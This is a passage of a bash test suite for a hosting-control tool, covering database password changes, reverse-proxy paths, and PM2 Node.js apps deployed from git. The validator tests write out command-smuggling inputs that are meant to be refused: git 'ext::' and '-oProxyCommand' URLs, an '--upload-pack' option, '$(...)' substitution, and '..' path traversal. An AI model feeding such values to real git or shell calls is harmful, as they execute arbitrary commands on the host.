assert_has   "MariaDB got that very password"       "ALTER USER 'pw_user'@'localhost' IDENTIFIED BY '${_pw_new}';" "$(cat "$TMP/pw.sql")"
assert_has   "the TCP account too, where it exists" "ALTER USER IF EXISTS 'pw_user'@'127.0.0.1' IDENTIFIED BY '${_pw_new}';" "$(cat "$TMP/pw.sql")"
assert_has   "the rest of db.info is kept"          "DB_NAME=pw_db" "$(cat "$_pw_dir/db.info")"
assert_eq    "with one DB_PASS line"                1 "$(grep -c '^DB_PASS=' "$_pw_dir/db.info")"
if (( CAN_CHMOD )); then assert_eq "db.info stays private" "600" "$(stat -c %a "$_pw_dir/db.info")"; fi
assert_eq    "the app's DB_PASSWORD follows"        "$_pw_new" "$(jq -r '.DB_PASSWORD' "$_pw_dir/app-env.json")"
assert_eq    "and so does DATABASE_URL"             "mysql://pw_user:${_pw_new}@127.0.0.1:3306/pw_db" "$(jq -r '.DATABASE_URL' "$_pw_dir/app-env.json")"
assert_eq    "other variables are left alone"       "untouched 3" "$(jq -r '"\(.API_KEY) \(.N)"' "$_pw_dir/app-env.json")"
assert_lacks "the log never sees the password"      "$_pw_new" "$(cat "$LOG_FILE")"
OPT_QUIET=0
out="$(lib_db_passwd pw.example.com 2>&1)"
assert_has   "the new login is printed for hand-written configs" "$(_pw_pass)" "$out"
assert_has   "and it says who needs it"             "own config file" "$out"
OPT_QUIET=1
_pw_reset
assert_eq    "unconfirmed, it refuses"              1 "$(OPT_YES=0 run_isolated lib_db_passwd pw.example.com)"
assert_eq    "and changes nothing"                  "$_pw_old" "$(_pw_pass)"
assert_false "nor talks to MariaDB"                 test -e "$TMP/pw.sql"
assert_eq    "a dry run succeeds"                   0 "$(OPT_DRY_RUN=1 run_isolated lib_db_passwd pw.example.com)"
assert_eq    "and changes nothing either"           "$_pw_old" "$(_pw_pass)"
lib_db_sql_secret() { return 1; }
assert_eq    "an SQL error fails the command"       1 "$(run_isolated lib_db_passwd pw.example.com)"
assert_eq    "db.info keeps the password that still works" "$_pw_old" "$(_pw_pass)"
assert_eq    "the app keeps it too"                 "$_pw_old" "$(jq -r '.DB_PASSWORD' "$_pw_dir/app-env.json")"
rm -f "$_pw_dir/db.info"
assert_eq    "a site without a database is refused" 1 "$(run_isolated lib_db_main passwd pw.example.com)"
assert_eq    "so is a missing domain"               1 "$(run_isolated lib_db_main passwd)"
assert_eq    "and an unknown site"                  1 "$(run_isolated lib_db_main passwd nosuch.example.com)"
rm -rf "$_pw_dir"
eval "$_orig_dbsec"; eval "$_orig_dbwait"
eval "$_orig_dbinst"; eval "$_orig_dbsql"

# =============================================================================
section "main menu: every item has a matching branch"
# The menu was renumbered when "List databases" went in at 5. An item that moved while its
# case label did not would silently run the WRONG command - "Remove a site" where the user
# picked "Status" - and no other test looks at the numbers at all.
_menu_block="$(awk '/_menu_group "SITES"/{f=1} f{print} f && /^[[:space:]]*esac/{exit}' "$ROOT/lib/menu.sh")"
_items="$(grep -oE '_menu_item[[:space:]]+[0-9]+' <<<"$_menu_block" | grep -oE '[0-9]+$' | sort -n | tr '\n' ' ')"
_branches="$(grep -oE '^[[:space:]]*[0-9]+(\|[^)]*)?\)' <<<"$_menu_block" | grep -oE '[0-9]+' | head -n 999 | sort -n | uniq | tr '\n' ' ')"
assert_true "the main menu block was found" test -n "$_menu_block"
assert_eq   "item numbers and case branches match" "$_items" "$_branches"
assert_has  "Databases is item 5"        '_menu_item  5 "Databases"' "$_menu_block"
assert_has  "and item 5 opens it"        '5) _menu_databases ;;' "$_menu_block"
assert_has  "Node.js apps is item 6"     '6) _menu_apps ;;' "$_menu_block"
assert_has  "Status is still item 8"     '8) _menu_run status ;;' "$_menu_block"
# "renew-ssl --all" passes over a site added without a certificate, so the menu needs a way
# to get that site its first one
assert_has  "Certificates is item 11"    '11) _menu_certificates ;;' "$_menu_block"
_body="$(awk '/^_menu_certificates\(\)/{f=1} f{print} f && /^[}]/{exit}' "$ROOT/lib/menu.sh")"
assert_has  "which gets one site a certificate" '_menu_run renew-ssl "$domain"' "$_body"
# ... and the same must hold for every other menu built from _menu_item (submenus included)
_menu_fns="$(grep -oE '^_?[a-z_]+\(\)' "$ROOT/lib/menu.sh" | tr -d '()' | tr '\n' ' ' || true)"
_menu_checked=0
for _fn in $_menu_fns; do
  # one-line functions end on their first line; the others at the first "}" in column 1
  _body="$(awk -v fn="$_fn" '$0 ~ ("^" fn "\\(\\)") { f = 1; print; if ($0 ~ /[}][[:space:]]*$/) exit; next } f { print } f && /^[}]/ { exit }' "$ROOT/lib/menu.sh")"
  grep -qE '_menu_item[[:space:]]+[0-9]' <<<"$_body" || continue
  _menu_checked=$((_menu_checked + 1))
  _items="$(grep -oE '_menu_item[[:space:]]+[0-9]+' <<<"$_body" | grep -oE '[0-9]+$' | sort -n | uniq | tr '\n' ' ' || true)"
  _branches="$(grep -oE '^[[:space:]]*[0-9]+(\|[^)]*)?\)' <<<"$_body" | grep -oE '[0-9]+' | sort -n | uniq | tr '\n' ' ' || true)"
  assert_eq "${_fn}: item numbers and case branches match" "$_items" "$_branches"
done
assert_true "every menu was found (main + pre-install at least)" test "$_menu_checked" -ge 2

# =============================================================================
section "sshd is only reloaded when it runs as a service"
# On socket-activated hosts (Ubuntu 24.04 default) ssh.service is inactive and there is
# nothing to reload, so "systemctl reload ssh" failed rc=1 and "reload sshd" rc=5. Both were
# logged as errors and then surfaced by "status" as recent problems on a healthy server.
_orig_sysctl="$(declare -f lib_systemctl)"; _orig_active="$(declare -f lib_service_active)"
_sc_calls=""; _ssh_active=0
lib_systemctl() { _sc_calls+="$* "; return 0; }
lib_service_active() { [[ "$1" == "ssh" && "$_ssh_active" == "1" ]]; }
assert_eq "socket-activated host still exits 0" 0 "$(run_isolated lib_ssh_reload)"
_sc_calls=""; lib_ssh_reload >/dev/null 2>&1
assert_eq "and issues no systemctl call at all" "" "$_sc_calls"
_ssh_active=1
_sc_calls=""; lib_ssh_reload >/dev/null 2>&1
assert_eq "a running service is reloaded once" "reload ssh " "$_sc_calls"
assert_eq "and that still exits 0" 0 "$(run_isolated lib_ssh_reload)"
eval "$_orig_sysctl"; eval "$_orig_active"   # restore, later sections use both

# =============================================================================
section "failure messages point at doctor"
_bs_save="$BIN_SHORT"; _bl_save="$BIN_LINK"
LIB_STEP_CURRENT=0
assert_eq "silent before any step has begun" "" "$(lib_suggest_doctor)"
LIB_STEP_CURRENT=3
assert_has "suggested once a step is running" "doctor" "$(lib_suggest_doctor)"
BIN_SHORT="$TMP/absent-short"; BIN_LINK="$TMP/absent-long"
assert_eq "falls back to the checkout when nothing is linked" "$SCRIPT_PATH" "$(lib_self_cmd)"
if (( CAN_CHMOD )); then
  : >"$TMP/lompbin"; chmod 0755 "$TMP/lompbin"
  BIN_SHORT="$TMP/lompbin"
  assert_eq "prefers the short alias once linked" "lompbin" "$(lib_self_cmd)"
fi
# end to end: the hint has to survive the real failure path, not just the helper
LIB_STEP_CURRENT=2
out="$( ( lib_die "boom" "a cause" "a fix" ) 2>&1 || true )"
assert_has "lib_die carries the hint" "doctor" "$out"
assert_has "and still says what failed" "boom" "$out"
LIB_STEP_CURRENT=0
out="$( ( lib_die "bad flag" "" "" ) 2>&1 || true )"
assert_lacks "argument errors stay free of it" "doctor" "$out"
BIN_SHORT="$_bs_save"; BIN_LINK="$_bl_save"

# =============================================================================
section "path proxies"
# Git Bash: jq is a native Windows binary and MSYS rewrites every argument that looks like a
# POSIX path, so "--arg p /api/" arrived as "C:/Program Files/Git/api/". MSYS_NO_PATHCONV
# would also stop it translating the /tmp file names jq has to open; exclude only the URL
# prefixes this section uses. Linux ignores the variable.
export MSYS2_ARG_CONV_EXCL="/api;/ws"
assert_eq    "path gets both slashes"          "/api/"    "$(lib_proxy_path_normalize api)"
assert_eq    "nested path kept"                "/api/v1/" "$(lib_proxy_path_normalize /api/v1)"
assert_eq    "dots inside a segment are fine"  "/v1.2/"   "$(lib_proxy_path_normalize /v1.2/)"
assert_false "the root is not a path proxy"    lib_proxy_path_normalize /
assert_false "no ACME path"                    lib_proxy_path_normalize /.well-known/acme-challenge/
assert_false "no dot segments"                 lib_proxy_path_normalize /api/../etc/
assert_false "no spaces"                       lib_proxy_path_normalize "/a b/"
assert_false "no empty segment"                lib_proxy_path_normalize //api/
assert_true  "target ip:port"                  lib_proxy_target_valid 127.0.0.1:3001
assert_true  "target host:port"                lib_proxy_target_valid backend.internal:8080
assert_false "target without a port"           lib_proxy_target_valid 127.0.0.1
assert_false "target port 0"                   lib_proxy_target_valid 127.0.0.1:0
assert_false "target port above 65535"         lib_proxy_target_valid 127.0.0.1:70000
assert_false "target with a scheme"            lib_proxy_target_valid http://127.0.0.1:3001
_h1="$(lib_proxy_handler_name example_com /api/)"
is_px_name() { [[ "$1" =~ ^example_com_px_[0-9a-f]{8}$ ]]; }
assert_true "handler name is site ident + 8-hex path hash" is_px_name "$_h1"
assert_eq   "handler name is stable" "$_h1" "$(lib_proxy_handler_name example_com /api/)"
assert_true "different paths get different handlers" test "$_h1" != "$(lib_proxy_handler_name example_com /api2/)"

lib_domain_state_reset
D_DOMAIN="px.example.com"; D_IDENT="px_example_com"; D_USER="px_example_com"; D_GROUP="px_example_com"
D_HOME="$SITES_ROOT/px.example.com"; D_MODE="wordpress"; D_PHP="8.3"; D_MEMORY="256M"; D_UPLOAD="64M"; D_PHP_CHILDREN=4
D_STATUS="active"; D_CREATED="2025-01-01T00:00:00Z"
lib_domain_state_save
lib_proxy_state_set px.example.com /ws/ 127.0.0.1:3002
lib_proxy_state_set px.example.com /api/ 127.0.0.1:3001
lib_proxy_state_set px.example.com /api/ 127.0.0.1:4001   # the same path again replaces it
_px_want="$(printf '/api/ 127.0.0.1:4001\n/ws/ 127.0.0.1:3002')"
lib_domain_state_load px.example.com
assert_eq "one entry per path, sorted" "$_px_want" "$D_PATH_PROXIES"
lib_domain_state_save; lib_domain_state_load px.example.com   # what renew-ssl and restore do
assert_eq "a domain.json save keeps them" "$_px_want" "$D_PATH_PROXIES"
lib_proxy_state_del px.example.com /api/
lib_proxy_state_del px.example.com /ws/
lib_domain_state_load px.example.com
assert_eq "removing the last one leaves none" "" "$D_PATH_PROXIES"
assert_eq "as an empty list" "[]" "$(jq -c '.proxies' "$(lib_domain_json px.example.com)")"
lib_domain_state_save; lib_domain_state_load px.example.com
assert_eq "and a later save does not bring them back" "" "$D_PATH_PROXIES"

# rendered in every mode, with and without TLS
D_PATH_PROXIES="$_px_want"
for _mode in php static proxy wordpress; do
  D_MODE="$_mode"; D_PROXY=""
  if [[ "$_mode" == "proxy" ]]; then D_PROXY="127.0.0.1:3000"; fi
  for _ssl in 0 1; do
    D_SSL="$_ssl"; _tag="${_mode} ssl=${_ssl}"
    out="$(lib_ols_render_vhconf)"; printf '%s\n' "$out" >"$TMP/px.vhconf"
    assert_true "path proxies ${_tag}: balanced" _ols_braces_balanced "$TMP/px.vhconf"
    assert_has  "path proxies ${_tag}: context" "context /api/ {" "$out"
    assert_has  "path proxies ${_tag}: handler" "handler                 $(lib_proxy_handler_name px_example_com /api/)" "$out"
    assert_has  "path proxies ${_tag}: extprocessor" "extprocessor $(lib_proxy_handler_name px_example_com /ws/) {" "$out"
    assert_has  "path proxies ${_tag}: target" "address                 127.0.0.1:4001" "$out"
    assert_has  "path proxies ${_tag}: websocket on the identical uri" "websocket /ws/ {" "$out"
    assert_eq   "path proxies ${_tag}: exits 0" 0 "$(run_isolated lib_ols_render_vhconf)"
  done
done
D_SSL=1; out="$(lib_ols_render_vhconf)"
assert_eq "hsts on every proxied path too" 3 "$(grep -c '^Strict-Transport-Security' <<<"$out")"

_px_conflict() { lib_proxy_conflict "$@" >/dev/null; }
D_MODE="proxy"; D_STATIC_PATHS="/static/,/assets/"
assert_true  "a static path of a proxy site cannot be proxied as well" _px_conflict /static/
assert_false "any other path can" _px_conflict /api/
D_MODE="php"
assert_false "php sites have no static path contexts" _px_conflict /static/

# add/remove end to end, with the configuration step stubbed
_orig_apply="$(declare -f lib_domain_apply_config)"; _orig_tcp="$(declare -f lib_tcp_open)"; _orig_tools="$(declare -f lib_require_tools)"
lib_tcp_open() { return 1; }
lib_require_tools() { return 0; }   # flock is not part of Git Bash
lib_domain_apply_config() { lib_die "configuration test failed" "" ""; }
( lib_proxy_add px.example.com /api/ 127.0.0.1:3001 ) >/dev/null 2>&1 || true
assert_eq "a rejected configuration leaves the state as it was" "[]" "$(jq -c '.proxies' "$(lib_domain_json px.example.com)")"
lib_domain_apply_config() { return 0; }
( lib_proxy_add px.example.com api 127.0.0.1:3001 ) >/dev/null 2>&1 || true
assert_eq "an accepted one is recorded, path normalized" '[{"path":"/api/","target":"127.0.0.1:3001"}]' "$(jq -c '.proxies' "$(lib_domain_json px.example.com)")"
assert_eq "adding to an unknown site fails"  1 "$(run_isolated lib_proxy_add nosuch.example.com /api/ 127.0.0.1:3001)"
assert_eq "an invalid target fails"          1 "$(run_isolated lib_proxy_add px.example.com /api/ nope)"
assert_eq "removing an unknown path fails"   1 "$(run_isolated lib_proxy_remove px.example.com /nope/)"
( lib_proxy_remove px.example.com /api ) >/dev/null 2>&1 || true
assert_eq "remove accepts the path without a slash" "[]" "$(jq -c '.proxies' "$(lib_domain_json px.example.com)")"
assert_eq "an unknown action fails" 1 "$(run_isolated lib_proxy_main frobnicate)"
eval "$_orig_apply"; eval "$_orig_tcp"; eval "$_orig_tools"
rm -rf "$(lib_domain_state_dir px.example.com)"
lib_domain_state_reset
unset MSYS2_ARG_CONV_EXCL

# =============================================================================
section "Node.js applications (PM2)"
assert_true  "env name"                       lib_app_env_key_valid API_KEY
assert_true  "env name with digits"           lib_app_env_key_valid S3_BUCKET_2
assert_false "lower-case env name"            lib_app_env_key_valid api_key
assert_false "PORT is set by lompstack"       lib_app_env_key_valid PORT
assert_false "PATH is set by lompstack"       lib_app_env_key_valid PATH
assert_false "PM2_* would steer pm2"          lib_app_env_key_valid PM2_HOME
assert_false "no leading digit"               lib_app_env_key_valid 1KEY
assert_true  "start: npm start"               lib_app_start_valid "npm start"
assert_true  "start: args with = and --"      lib_app_start_valid "npm run serve -- --port=3000"
assert_false "start: no &&"                   lib_app_start_valid "npm run build && npm start"
assert_false "start: no pipe"                 lib_app_start_valid "node app.js | tee log"
assert_false "start: no quotes"               lib_app_start_valid "node -e 'x'"
assert_false "start: no substitution"         lib_app_start_valid 'node $(cat f)'
assert_true  "script: dist/main.js"           lib_app_script_valid dist/main.js
assert_false "script: no parent directory"    lib_app_script_valid ../x.js
assert_false "script: no absolute path"       lib_app_script_valid /etc/x.js
assert_false "script: no dot segment"         lib_app_script_valid a/./b.js

lib_domain_parse_add_args node.example.com --node --port 3100 --start "npm run serve" --no-ssl
assert_eq "--node is a proxy site"                      "proxy"         "$D_MODE"
assert_eq "--node keeps the port"                       "3100"          "$APP_OPT_PORT"
assert_eq "--node keeps the start command"              "npm run serve" "$APP_OPT_START"
assert_eq "--node serves no static paths from disk"     ""              "$D_STATIC_PATHS"
lib_domain_parse_add_args node.example.com --node --static-paths "/public/"
assert_eq "--static-paths still counts with --node"     "/public/"      "$D_STATIC_PATHS"
assert_eq "--node with --proxy is refused"   1 "$(run_isolated lib_domain_parse_add_args n.example.com --node --proxy 127.0.0.1:3000)"
assert_eq "--port without --node is refused" 1 "$(run_isolated lib_domain_parse_add_args n.example.com --port 3100)"
assert_eq "a shell --start is refused"       1 "$(run_isolated lib_domain_parse_add_args n.example.com --node --start "npm run a && npm run b")"

# the site the rest of this section works on
lib_domain_state_reset
D_DOMAIN="app.example.com"; D_IDENT="app_example_com"; D_USER="app_example_com"; D_GROUP="app_example_com"
D_HOME="$SITES_ROOT/app.example.com"; D_MODE="proxy"; D_PROXY="127.0.0.1:3000"; D_STATIC_PATHS=""
D_STATUS="active"; D_CREATED="2025-01-01T00:00:00Z"
mkdir -p "$D_HOME/app"
lib_domain_state_save
APP_PORT=3000; APP_START="npm start"; APP_SCRIPT=""; APP_MEMORY=""; APP_ENABLED=1
lib_app_state_write app.example.com
APP_PORT=""; APP_START=""; APP_ENABLED=0
assert_true "state: the site runs an app" lib_app_state_load app.example.com
assert_eq   "state: port"    "3000"      "$APP_PORT"
assert_eq   "state: start"   "npm start" "$APP_START"
assert_eq   "state: enabled" "1"         "$APP_ENABLED"
APP_ENABLED=0; lib_app_state_write app.example.com; lib_app_state_load app.example.com
assert_eq   "state: a stopped app stays stopped (false survives the reload)" "0" "$APP_ENABLED"
lib_domain_state_load app.example.com; lib_domain_state_save
assert_true "a domain.json save keeps .app" lib_app_state_load app.example.com
assert_false "a site without .app runs none" lib_app_state_load nothing-here.example.com
D_HOME="$SITES_ROOT/app.example.com"   # Git Bash rewrites paths passed to jq.exe; keep ours
# no site users here: run "as the site user" in a subshell in that directory instead
_orig_as="$(declare -f _app_as)"
assert_has "_app_as starts from an empty environment" "env -i" "$_orig_as"
assert_has "_app_as hands the site user no lock descriptor" "200>&- 201>&-" "$_orig_as"
assert_has "_app_as creates nothing world-readable" "umask 027" "$_orig_as"
_app_as() { local dir="$1"; shift; ( cd "$dir" && "$@" ); }

APP_SCRIPT=""; APP_START="npm start"
printf '{"scripts":{"start":"node dist/server.js --color"}}' >"$D_HOME/app/package.json"
assert_eq "npm start that is plain node runs node itself" '{"script":"dist/server.js","args":["--color"]}' "$(lib_app_command_json)"
printf '{"scripts":{"start":"next start -p 3000"}}' >"$D_HOME/app/package.json"
assert_eq "anything else stays npm start" '{"script":"npm","args":["start"]}' "$(lib_app_command_json)"
APP_START="yarn start"
assert_eq "other commands are split into words" '{"script":"yarn","args":["start"]}' "$(lib_app_command_json)"
APP_START=""; APP_SCRIPT="dist/main.js"
assert_eq "--script runs the file" '{"script":"dist/main.js","args":[]}' "$(lib_app_command_json)"
APP_SCRIPT=""; APP_START="npm start"
assert_true  "runnable once package.json exists" lib_app_runnable
rm -f "$D_HOME/app/package.json"
assert_false "waiting for code without package.json" lib_app_runnable
APP_SCRIPT="dist/main.js"
assert_false "waiting for code without the script file" lib_app_runnable
mkdir -p "$D_HOME/app/dist"; : >"$D_HOME/app/dist/main.js"
assert_true  "runnable once the script exists" lib_app_runnable

out="$(lib_app_render_unit /usr/bin/pm2)"
assert_has   "unit runs as the site user"            "User=app_example_com" "$out"
assert_has   "unit keeps PM2 inside the site"        "Environment=PM2_HOME=$D_HOME/.pm2" "$out"
assert_has   "unit starts the daemon with ping"      "ExecStart=/usr/bin/pm2 ping" "$out"
assert_has   "a failing app cannot fail the unit"    "ExecStartPost=-/usr/bin/pm2 start $D_HOME/.pm2/lomp.ecosystem.json" "$out"
assert_has   "unit hardening"                        "NoNewPrivileges=yes" "$out"
assert_lacks "never as root"                         "User=root" "$out"
assert_lacks "no dump/resurrect state"               "resurrect" "$out"
APP_PORT=3000; APP_MEMORY="512M"; APP_ENABLED=1
eco="$(MSYS_NO_PATHCONV=1 lib_app_render_ecosystem '{"script":"npm","args":["start"]}' '{"API_KEY":"s3cr3t","NODE_ENV":"staging","PORT":"9999"}')"
_eco() { jq -r "$1" <<<"$eco"; }
assert_eq "ecosystem is valid JSON"                   "object"  "$(_eco 'type')"
assert_eq "one process named web"                     "web"     "$(_eco '.apps[0].name')"
assert_eq "fork mode"                                 "fork"    "$(_eco '.apps[0].exec_mode')"
assert_eq "no instances (that would mean cluster)"    "null"    "$(_eco '.apps[0].instances')"
assert_eq "the inherited environment is filtered out" "true"    "$(_eco '.apps[0].filter_env')"
assert_eq "cwd is the app directory"                  "$D_HOME/app" "$(_eco '.apps[0].cwd')"
assert_eq "PORT always comes from lompstack"          "3000"    "$(_eco '.apps[0].env.PORT')"
assert_eq "user variables are passed"                 "s3cr3t"  "$(_eco '.apps[0].env.API_KEY')"
assert_eq "NODE_ENV can be overridden"                "staging" "$(_eco '.apps[0].env.NODE_ENV')"
assert_eq "memory limit"                              "512M"    "$(_eco '.apps[0].max_memory_restart')"
APP_ENABLED=0
assert_eq "a stopped app has no process" "0" "$(MSYS_NO_PATHCONV=1 lib_app_render_ecosystem '{"script":"npm","args":["start"]}' '{}' | jq '.apps | length')"
APP_ENABLED=1; APP_MEMORY=""
assert_eq "no limit, no limit key" "null" "$(MSYS_NO_PATHCONV=1 lib_app_render_ecosystem '{"script":"npm","args":["start"]}' '{}' | jq '.apps[0].max_memory_restart')"
envf="$(lib_app_render_envfile '{"A":"it'"'"'s $HOME","B":"x y"}')"
assert_eq "the env file survives the shell" "it's \$HOME|x y" "$( ( eval "$envf"; printf '%s|%s' "$A" "$B" ) )"
assert_eq "unit renderer exits 0"      0 "$(run_isolated lib_app_render_unit /usr/bin/pm2)"
assert_eq "ecosystem renderer exits 0" 0 "$(run_isolated lib_app_render_ecosystem '{"script":"npm","args":[]}' '{}')"
assert_eq "env file renderer exits 0"  0 "$(run_isolated lib_app_render_envfile '{}')"

# ports: another site's application port and loopback proxy targets are taken
_orig_holder="$(declare -f lib_port_holder)"
lib_port_holder() { if [[ "$1" == "3005" ]]; then printf 'node (pid 42)'; fi; }
assert_eq    "another site's app port is taken" "port 3000 is already used by app.example.com" "$(lib_app_port_conflict 3000 other.example.com || true)"
assert_false "a site may keep its own port"     lib_app_port_conflict 3000 app.example.com
assert_has   "a port in use is refused"         "node (pid 42)"          "$(lib_app_port_conflict 3005 || true)"
assert_has   "MariaDB's port is refused"        "service of this server" "$(lib_app_port_conflict 3306 || true)"
assert_has   "privileged ports are refused"     "between 1024"           "$(lib_app_port_conflict 80 || true)"
assert_has   "garbage is refused"               "between 1024"           "$(lib_app_port_conflict 30x0 || true)"
ss() { return 0; }
assert_eq "the first free port skips the taken ones" "3001" "$(lib_app_port_pick)"
unset -f ss
eval "$_orig_holder"

# apply: files as the site user, the unit, then the service - with systemd and pm2 stubbed
APP_UNIT_DIR="$TMP/systemd"; mkdir -p "$APP_UNIT_DIR"
_orig_sc="$(declare -f lib_systemctl)"; _orig_act="$(declare -f lib_service_active)"
_orig_en="$(declare -f lib_service_enabled)"; _orig_wait="$(declare -f lib_app_wait_port)"; _orig_lock="$(declare -f _app_site_lock)"
_orig_tools="$(declare -f lib_require_tools)"
_sc_calls=""; lib_systemctl() { _sc_calls+="$* "; return 0; }
lib_service_active() { return 1; }; lib_service_enabled() { return 1; }
lib_app_wait_port() { return 0; }; _app_site_lock() { return 0; }; lib_require_tools() { return 0; }
pm2() { return 0; }
APP_START="npm start"; APP_SCRIPT=""; APP_PORT=3000; APP_ENABLED=1; APP_MEMORY=""
rm -f "$D_HOME/app/package.json"
printf '{"API_KEY":"top-s3cr3t-value"}' >"$(lib_app_env_file app.example.com)"
lib_app_apply
assert_eq    "no code yet: waiting"                  "waiting" "$APP_RESULT"
assert_true  "ecosystem written"                     test -s "$D_HOME/.pm2/lomp.ecosystem.json"
assert_true  "unit written"                          test -s "$APP_UNIT_DIR/pm2-app_example_com.service"
assert_has   "builds get the values from the env file" "top-s3cr3t-value" "$(cat "$D_HOME/.pm2/lomp.env")"
if (( CAN_CHMOD )); then assert_eq "the ecosystem is private" "600" "$(stat -c %a "$D_HOME/.pm2/lomp.ecosystem.json")"; fi
assert_lacks "and nothing was started"               "start" "$_sc_calls"
printf '{"scripts":{"start":"node server.js"}}' >"$D_HOME/app/package.json"
_sc_calls=""; lib_app_apply
assert_eq    "code present: running"                 "running" "$APP_RESULT"
assert_has   "the unit is enabled"                   "enable pm2-app_example_com" "$_sc_calls"
assert_has   "and started"                           "start pm2-app_example_com" "$_sc_calls"
lib_service_active() { return 0; }; lib_service_enabled() { return 0; }
APP_ENABLED=0; _sc_calls=""; lib_app_apply
assert_eq    "stopped on purpose"                    "stopped" "$APP_RESULT"
assert_has   "the service is stopped"                "stop pm2-app_example_com" "$_sc_calls"
assert_has   "and no longer starts at boot"          "disable pm2-app_example_com" "$_sc_calls"
rm -f "$D_HOME/.pm2/lomp.ecosystem.json"
APP_ENABLED=1
out="$(OPT_DRY_RUN=1 OPT_QUIET=0 lib_app_apply 2>&1)"
assert_false "a dry run writes no ecosystem"         test -e "$D_HOME/.pm2/lomp.ecosystem.json"
assert_lacks "and prints no value"                   "top-s3cr3t-value" "$out"

# env: the value comes from stdin, never from the command line, and never reaches the log
APP_ENABLED=1; lib_app_state_write app.example.com
printf 'val with spaces & "quotes"\n' | lib_app_env app.example.com set DATABASE_URL >/dev/null 2>&1
assert_eq "env set stores what stdin gave"          'val with spaces & "quotes"' "$(jq -r '.DATABASE_URL' "$(lib_app_env_file app.example.com)")"
assert_eq "a value on the command line is refused"  1 "$(run_isolated lib_app_env app.example.com set API_KEY oops)"
assert_eq "a reserved name is refused"              1 "$(run_isolated lib_app_env app.example.com set PORT </dev/null)"
lib_app_env app.example.com unset DATABASE_URL >/dev/null 2>&1
assert_eq "env unset removes it"                    "null" "$(jq -r '.DATABASE_URL' "$(lib_app_env_file app.example.com)")"
assert_lacks "the log never sees a value"           "val with spaces" "$(cat "$LOG_FILE")"

# remove: the service goes before the files and the user
lib_domain_state_load app.example.com; D_HOME="$SITES_ROOT/app.example.com"
_sc_calls=""; lib_app_teardown >/dev/null 2>&1
assert_has   "the service is disabled and stopped"   "disable --now pm2-app_example_com" "$_sc_calls"
assert_false "and its unit file deleted"             test -e "$APP_UNIT_DIR/pm2-app_example_com.service"
lib_domain_logrotate_regen
assert_has   "PM2 logs are rotated as the site user" "su app_example_com app_example_com" "$(cat "$LOGROTATE_SITES_FILE")"
assert_has   "the daemon's own log as well"          ".pm2/pm2.log" "$(cat "$LOGROTATE_SITES_FILE")"
APP_SCRIPT=""; APP_START="npm run serve -- --port=3000"
assert_eq    "arguments that look like options stay arguments" '{"script":"npm","args":["run","serve","--","--port=3000"]}' "$(lib_app_command_json)"

assert_eq "runuser only through _app_as" "1" "$(grep -c 'runuser' "$ROOT/lib/app.sh")"
assert_eq "pm2 output that carries the environment never goes to the log" "" \
  "$(grep -nE 'lib_run[^|;]*pm2[^|;]*(jlist|env|show|describe)' "$ROOT"/lib/*.sh || true)"
# /proc/<pid>/cmdline is readable by every user: another site must never see these values
assert_lacks "application variables never reach jq's command line" '--argjson env' "$(declare -f lib_app_render_ecosystem)"
assert_eq "root never reads the app directory with jq (the site user controls it)" "" \
  "$(grep -nE 'jq[^|]*\$\{?D_HOME\}?/app' "$ROOT/lib/app.sh" || true)"
_orig_write="$(declare -f _app_write_as_user)"
_app_write_as_user() { cat >/dev/null; return 1; }
APP_ENABLED=1; lib_app_apply
assert_eq "a home the app files cannot be written to is reported, not fatal" "failed" "$APP_RESULT"
assert_eq "and apply exits 0 with errexit armed" 0 "$(run_isolated lib_app_apply)"
eval "$_orig_write"
eval "$_orig_as"; eval "$_orig_sc"; eval "$_orig_act"; eval "$_orig_en"; eval "$_orig_wait"; eval "$_orig_lock"; eval "$_orig_tools"
unset -f pm2
lib_json_set "$(lib_domain_json app.example.com)" 'del(.app)'
rm -f "$(lib_app_env_file app.example.com)"
lib_domain_state_reset

# =============================================================================
section "Node.js applications: deploy from git"
assert_true  "git: https"                          lib_app_git_url_valid https://github.com/owner/repo.git
assert_true  "git: scp-style ssh"                  lib_app_git_url_valid git@github.com:owner/repo.git
assert_true  "git: ssh URL with a port"            lib_app_git_url_valid ssh://git@git.example.com:2222/owner/repo.git
assert_true  "git: a local bare repository"        lib_app_git_url_valid file:///srv/repos/app.git
assert_false "git: a token inside is refused"      lib_app_git_url_valid https://ghp_abcdef1234567890@github.com/owner/repo.git
assert_false "git: user:password is refused"       lib_app_git_url_valid https://user:secret@gitlab.com/owner/repo.git
assert_false "git: plain http is refused"          lib_app_git_url_valid http://github.com/owner/repo.git
assert_false "git: ext:: runs commands, refused"   lib_app_git_url_valid 'ext::sh -c touch% /tmp/x'
assert_false "git: an option is refused"           lib_app_git_url_valid --upload-pack=touch
assert_false "git: empty is refused"               lib_app_git_url_valid ""
assert_false "git: a user that reads as an option" lib_app_git_url_valid 'git@-oProxyCommand:x'
assert_false "git: an ssh:// user as an option"    lib_app_git_url_valid 'ssh://-oProxyCommand@host/x'
assert_false "git: a path that reads as an option" lib_app_git_url_valid 'git@host:-oProxyCommand=x'
assert_false "git: a token in the query string"    lib_app_git_url_valid 'https://gitlab.example.com/o/r.git?private_token=abc'
assert_true  "branch: main"                        lib_app_git_branch_valid main
assert_true  "branch: release/1.2"                 lib_app_git_branch_valid release/1.2
assert_false "branch: an option is refused"        lib_app_git_branch_valid --orphan
assert_false "branch: .. is refused"               lib_app_git_branch_valid a..b
assert_false "branch: .lock is refused"            lib_app_git_branch_valid topic.lock
assert_false "branch: a hidden component"          lib_app_git_branch_valid feature/.x
assert_false "branch: HEAD is not a branch"        lib_app_git_branch_valid HEAD
assert_true  "install: the first deploy installs"  _app_install_needed abc "" 0
assert_true  "install: a changed lockfile"         _app_install_needed abc def 1
assert_true  "install: node_modules missing"       _app_install_needed abc abc 0
assert_false "install: nothing changed"            _app_install_needed abc abc 1
assert_eq "git arguments cannot be read as options" "" \
  "$(grep -nE '_app_git (clone|ls-remote|-C app fetch)' "$ROOT/lib/app.sh" | grep -v -- ' -- ' || true)"
lib_domain_parse_add_args gitapp.example.com --node --git git@github.com:o/r.git --branch main
assert_eq "--git is kept for the first deploy" "git@github.com:o/r.git" "$APP_OPT_GIT"
assert_eq "--branch too" "main" "$APP_OPT_BRANCH"
assert_eq "--git with a token is refused"   1 "$(run_isolated lib_domain_parse_add_args g.example.com --node --git https://tok_1234567890abcdefghij@github.com/o/r.git)"
assert_eq "--branch without --git is refused" 1 "$(run_isolated lib_domain_parse_add_args g.example.com --node --branch main)"
assert_eq "--git without --node is refused" 1 "$(run_isolated lib_domain_parse_add_args g.example.com --git git@github.com:o/r.git)"

# a deploy keeps its output (masked) and records the outcome; a failed step stops the rest
lib_domain_state_reset
